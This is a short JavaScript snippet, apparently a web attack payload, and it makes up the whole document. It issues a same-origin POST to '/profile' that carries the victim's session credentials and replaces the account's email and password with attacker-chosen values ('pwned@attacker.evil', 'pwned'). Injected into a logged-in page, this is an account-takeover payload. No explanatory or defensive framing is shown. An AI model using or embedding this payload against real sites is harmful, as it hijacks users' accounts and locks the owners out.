fetch("/profile", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "email=pwned@attacker.evil&password=pwned",
  credentials: "same-origin",
});
